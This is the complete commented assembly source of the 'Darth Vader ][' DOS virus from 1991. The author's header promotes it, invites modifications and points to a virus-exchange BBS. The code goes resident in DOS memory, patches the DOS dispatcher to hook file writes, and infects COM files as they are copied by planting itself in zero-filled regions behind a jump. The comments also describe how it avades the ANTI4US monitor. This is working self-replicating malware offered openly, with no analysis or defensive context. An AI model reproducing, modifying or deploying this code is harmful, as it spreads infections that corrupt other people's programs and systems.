;*******************************************************************************
;*									       *
;*			      D A R T H   V A D E R   ][		       *
;*									       *
;*	(C) - Copyright 1991 by Waleri Todorov, CICTT-Sofia		       *
;*	All Rights Reserved						       *
;*									       *
;*	This is the second release of Darth Vader virus. Now he infect only    *
;*	those COM file, wich have area of 345 (or more) zeros. Virus put       *
;*	himself in this area and make jump to its code. As before, he can't    *
;*	be stoped by ANTI4US or disk write utilities - DOS function 40h        *
;*	(WRITE to File/Device). The virus operate in memory only, so there is  *
;*	no slowing in operations. This release of virus support DOS versions   *
;*	from 2.X till 4.X.						       *
;*	    You may make any modifications in this source, BUT let me know     *
;*	what have you done (drop message at Virus eXchange BBS) 	       *
;*						  Waleri Todorov	       *
;*******************************************************************************


		org	0		; Virus start offset  is 0

		call	NextLine	; Call next instruction
NextLine
		pop	si		; and calculate its present location
		sub	si,3

		mov	[0f0h],si	; Save own location in PSP
		mov	[0FEh],ax	; Save AX in PSP (Important for DOS
					  ; external commands)
		xor	ax,ax		; Make DS point in interrupts vectors
		mov	ds,ax		;
		mov	es,[2Bh*4+2]	; Load ES with DOS segment from int2B
		mov	ax,9000h	; DS will point at 9000h
		mov	ds,ax		; usualy there are zeros
		xor	di,di		; ES:DI point first byte in DOS segment

NextZero
		inc	di		; Next byte
		cmp	di,0F00h	; If more than F00 bytes checked
		ja	ReturnControl	; then suppose no room and exit
		push	di		; else save tested offset
		xor	si,si		; DS:SI  == 9000:0000 (zeros area)
		mov	cx,offset LastByte	; Size of virus
		repe	cmpsb		; Compare until equal
		pop	di		; Restore tested area offset
		jcxz	Found		; If tested area is fill with zeros->
		jmp	short NextZero	; else check next
Found					; <- Will install himself in this area
		mov	si,cs:[0F0h]	; Get own start address (maybe diff.)
		mov	cs:[0F2h],di	; Save offset in DOS segment
		push	cs		; Set DS point to virus segment
		pop	ds		;
		mov	cx,offset LastByte	; Size of virus
		rep	movsb		; Move itself in DOSSEG
		push	es		; Set DS point to DOSSEG
		pop	ds

		mov	si,di		; From this offset (after virus)
NextCall				; Will search DOS dispatcher
		inc	si		; Next byte
		jz	ReturnControl	; If segment overrun -> Return control
		push	si		; Save tested area offset
		lodsw		; Load word from DS:SI
		xchg	ax,bx	; and put readed value in BX
		lodsb		; Load byte from DS:SI
		cmp	bx,0FF36h	; Check 'magic' bytes
		je	CheclAl 	; If first word match -> check last
AgainCall
		pop	si		; else restore offset
		jmp	short NextCall	; and go search next byte
CheclAl
		cmp	al,16h		; Check last 'magic' byte
		jne	AgainCall	; If not match go search next byte

		pop	si		; Else restore founded offset
		push	si		; and save it for further usage
		mov	di,cs:[0F2h]	; Get virus offset
		mov	[4],di		; and save it to DOSSEG
		add	di,offset HandleCall	; DI now adjusted to
		movsw			; original dispatcher place
		movsw		; Original dispatcher go  at ES:DI for
		movsb		; further calls from virus
		pop	di	; Restore founded offset
		mov	al,9Ah	; and put an absolute FAR CALL
		stosb
		mov	ax,offset Handle	; Put offset of new dispatcher
		add	ax,cs:[0F2h]	; adjust him for different offsets
		stosw		; and store offset in FAR CALL
		mov	ax,es	; put DOSSEG either in FAR CALL
		stosw

; Since this moment virus is installed and operated in memory. If make a copy
; of a file with DOS copy or PCTools and if file have area of 345 (or more)
; zeros, the copy (not the original)  will became infected. Copied file will
; operate correctly when you start him. The virus logic allow multiple copies
; of the virus in the memory so you may have file with several copies of virus
; (each memory copy put himself in file)


ReturnControl			; Return control to main program
		push	cs	; Set DS and ES to point at PSP
		push	cs
		pop	ds
		pop	es
		mov	di,100h ; Set ES:DI point start of file at PSP:100
		push	di	; Put DI in stack for dummy return
		mov	si,[0F0h]	; Get beginning of the virus
		add	si,offset First3	; and adjust for first 3 instr.
		movsw		; Move saved First instructions
		movsb		;
		mov	ax,[0FEh]	; Restore saved AX (required by DOS
		ret			; external command. Return control
				; via dummy RET
Fail
		jmp	Do	; Requested jump!  Don't touch here!

Handle
		mov	cs:[0Ah],ds	; Save write buffer segment
		mov	cs:[0Ch],dx	; Save write buffer offset
		mov	cs:[0Eh],cx	; Save write buffer size

		push	ax		; Save important registers
		push	bx
		push	cx
		push	es
		push	si
		push	di

		cmp	ah,40h		; If function is not 40 (WRITE)
		jne	Fail		; then call DOS with no infection

		cmp	cx,offset LastByte+10h	; Check if size of buffer
		jb	Fail		; is big enough to hold all virus

		mov	ax,1220h	; Get file handle internal table number
		int	2Fh		; Via int2F  (undocumented)
		mov	bl,es:[di]	; Load table number to BL
		mov	ax,1216h	; Get handle table address in ES:DI
		int	2Fh		; Via int2F  (undocumented)
		add	di,28h		; ES:DI will point file extension

		push	cs		; Set DS to point in virus
		pop	ds

		mov	si,offset Com	; SI point to COM string
		add	si,[4]		; adjust for different offsets
		mov	cx,3		; Will compare 3 bytes
		repe	cmpsb		; Compare until equal
		jne	Do		; If not equal -> exit with no infect

		push	ds		; ES point to virus (DOS) segment
		pop	es
		mov	ds,cs:[0Ah]	; DS point to write buffer segment
		mov	si,cs:[0Ch]	; SI point to write buffer offset
		mov	di,offset First3	; DI point to save area for
		add	di,cs:[4]	; first 3 instruction. Adjust fo offset
		movsw		; Save first 3 instruction from write buffer
		movsb		; to virus buffer

		mov	ax,9000h	; ES wil point zeros at 9000
		mov	es,ax
		mov	cx,cs:[0Eh]	; Restore write buffer size
SearchHole
		xor	di,di		; ES:DI point to 9000:0000
		inc	si		; SI point next byte from write buffer
		dec	cx		; Decrease remaining bytes
		jz	Do		; If test all buffer -> no infection
		push	cx		; Save remain buffer size
		push	si		; Save current buffer offset
		mov	cx,offset LastByte	; Will check for virus size only
		repe	cmpsb		; Check until equal
		pop	si		; Restore tested area offset
		jcxz	FoundHole	; If 345 zeros -> Go infect
		pop	cx		; Else restore remain buffer size
		jmp	short SearchHole	; And go check next byte
FoundHole
		pop	cx	; Restore remain buffer size
		push	si	; Save DS:SI (point to zeros in write buffer)
		push	ds	;
		mov	es,cs:[0Ah]	; ES:DI point to beginning of buffer
		mov	di,cs:[0Ch]	;
		mov	al,0E9h 	; Put a NEAR JMP in buffer
		stosb			;
		sub	si,cs:[0Ch]	; Calculate argument for JMP
		sub	si,3
		mov	ax,si		; and store it	in buffer
		stosw			;

		pop	es		; ES:DI now will point to zeros
		pop	di		; and the JMP address point here
				; So virus will receive control first
		push	cs	; DS:SI will point to virus code in memory
		pop	ds
		mov	si,cs:[4]	; Adjust for different offsets
		mov	cx,offset LastByte	; Will move virus size only
		rep	movsb		; Move virus in write buffer

Do
		pop	di		; Restore important registers
		pop	si
		pop	es
		pop	cx
		pop	bx
		pop	ax

		mov	dx,cs:[0Ch]	; Restore write buffer address
		mov	ds,cs:[0Ah]	; to DS:DX

HandleCall
		db	5 dup (0)	; Here come original DOS jump instr.
					; Usualy it is CALL SS:[MemOffs]
					; In original DOS jump instr. is placed
					; a FAR CALL to new WRITE handler
		retf		; Return to DOS

First3				; Here come first 3 instruction of infected file
		int	20h	; Now they are dummy terminate
		nop
Com
		db	'COM'   ; String to check for any COM file

		db	'Darth Vader'   ; Virus signature

LastByte			; Dummy label to compute virus	size
		nop
